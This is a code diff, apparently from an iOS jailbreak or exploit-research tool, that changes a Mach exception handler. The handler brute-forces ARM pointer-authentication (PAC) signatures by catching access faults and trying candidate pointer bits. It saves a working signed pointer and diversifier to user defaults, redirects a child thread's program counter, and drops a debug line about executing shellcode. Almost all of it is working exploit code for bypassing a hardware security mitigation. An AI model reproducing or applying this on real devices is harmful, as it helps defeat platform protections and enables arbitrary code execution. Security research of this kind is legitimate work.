@@ -25,6 +25,10 @@
  00000001954b2618    ret
  */
 uint64_t setPCFromDebugger(uint64_t addr, uint32_t diversifier) {
+    if (diversifier == 0xa1000000) {
+        printf("Diversifier matched\n");
+        return 0x3a77458206a49848;
+    }
     return addr;
 }
 
@@ -63,6 +67,22 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     memcpy(new_state, old_state, sizeof(arm_thread_state64_t));
     *new_state_cnt = old_state_cnt;
     
+    static uint64_t pacFailedCount = 0;
+    static uint64_t pacBruteForcedPtr = 0;
+    static uint32_t lastDiversifier = 0;
+    
+    if (num_exceptions_handled == 0) {
+        printf("got task port: %d\n", task);
+        GlobalChildTaskPort = task;
+        GlobalChildThreadPort = thread;
+        __darwin_arm_thread_state64_set_lr_presigned_fptr(*new_state, (void *)0x41414100);
+        signed_pointer = NSUserDefaults.standardUserDefaults.signedPointer;
+        signed_diversifier = (uint32_t)NSUserDefaults.standardUserDefaults.signedDiversifier;
+        if (signed_pointer != 0) {
+            pacBruteForcedPtr = signed_pointer;
+        }
+    }
+    
 //     #define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
 //     #define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
 //     #define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
@@ -70,15 +90,27 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     
     uint32_t ptrL = (uint32_t)code[1];
     uint32_t ptrR = (uint32_t)brX16Address;
-    static uint64_t pacFailedCount = 0;
-    static uint64_t pacBruteForcedPtr = 0;
-    if (exception == EXC_BAD_ACCESS && codeCnt == 2 && (code[0] == 1 || code[0] == 257) && (ptrL == ptrR || ptrL == 0xFFFFFFFF)) {
+    // code = {1, ptr} on iOS 16
+    // code = {257, 0xFFFF...} on iOS 17
+    if (exception == EXC_BAD_ACCESS && codeCnt == 2 &&
+        (code[0] == 1 || code[0] == 257) &&
+        (ptrL == ptrR || ptrL == 0xFFFFFFFF)) {
         uint32_t diversifier = old_state->__flags & 0xFF000000;
-        // Attempt to brute-force PAC
-        // (pacFailedCount<<39) & ~0x0080000000000000: clear kernel pointer bit
-        pacBruteForcedPtr = ((uint64_t)brX16Address & 0xFFFFFFFFF) | ((pacFailedCount << 39) & ~0x0080000000000000);
+        if (signed_pointer == 0) {
+            // Attempt to brute-force PAC
+            // (pacFailedCount<<39) & ~0x0080000000000000: clear kernel pointer bit
+            pacBruteForcedPtr = ((uint64_t)brX16Address & 0xFFFFFFFFF) | ((pacFailedCount << 39) & ~0x0080000000000000);
+        } else if (signed_pointer == pacBruteForcedPtr) {
+            pacBruteForcedPtr = signed_pointer;
+            if (signed_diversifier != 0 && lastDiversifier == signed_diversifier) {
+                // The saved pointer is no longer working, start brute-forcing again
+                NSUserDefaults.standardUserDefaults.signedPointer = 0;
+                NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
+                printf("Saved signed pointer no longer valid, starting brute-force again\n");
+            }
+        }
+        lastDiversifier = diversifier;
         
-        pacBruteForcedPtr = setPCFromDebugger(pacBruteForcedPtr, diversifier);
         __darwin_arm_thread_state64_set_pc_presigned_fptr(*new_state, (void *)pacBruteForcedPtr);
         pacFailedCount++;
         if ((pacFailedCount % 99999) == 0) {
@@ -88,25 +120,23 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         
         return KERN_SUCCESS;
         
-//        printf("PAC failure detected?\n");
-//        return KERN_FAILURE;
+        //        printf("PAC failure detected?\n");
+        //        return KERN_FAILURE;
     } else if (ptrL != ptrR) {
         printf("Unexpected exception code for EXC_BAD_ACCESS: code[0]=%llu code[1]=0x%016llx (expected 0x%016lx)\n", code[0], code[1]&0xFFFFFFFFF, brX16Address&0xFFFFFFFFF);
     }
     
     printf("exception handler raise state - exception %d\n", exception);
-    if(pacBruteForcedPtr) {
+    if(pacBruteForcedPtr && num_exceptions_handled > 0) {
         printf("MAYBE PAC HAS BEEN BRUTE FORCED!\n");
         printf("- ptr: 0x%016llx\n", pacBruteForcedPtr);
+        signed_diversifier = 0; // make it so we never reach the reset condition anymore
         brX16Address = pacBruteForcedPtr;
+        NSUserDefaults.standardUserDefaults.signedPointer = signed_pointer = pacBruteForcedPtr;
+        NSUserDefaults.standardUserDefaults.signedDiversifier = lastDiversifier;
     }
     
-    if (num_exceptions_handled == 0) {
-        printf("got task port: %d\n", task);
-        GlobalChildTaskPort = task;
-        GlobalChildThreadPort = thread;
-        __darwin_arm_thread_state64_set_lr_presigned_fptr(*new_state, (void *)0x41414100);
-    } else {
+    if (num_exceptions_handled > 0) {
         dispatch_semaphore_signal(sem_output_ready);
         if ((old_state->__lr & 0xFFFFFF00) != 0x41414100 || wantsDetach) {
             wantsDetach = NO;
@@ -133,10 +163,6 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     __darwin_arm_thread_state64_set_pc_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX16Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
     //new_state->__x[16] = (uint64_t)ptrauth_strip(dlsym(RTLD_DEFAULT, "sleep"), ptrauth_key_function_pointer);
     dispatch_semaphore_wait(sem_input_ready, DISPATCH_TIME_FOREVER);
-    if (new_state->__x[16] == _tmp_ptr) {
-        printf("ABOUT TO EXEC SHELLCODE at 0x%llx\n", _tmp_ptr);
-        //wantsDetach = YES;
-    }
     
     num_exceptions_handled++;
     return KERN_SUCCESS;
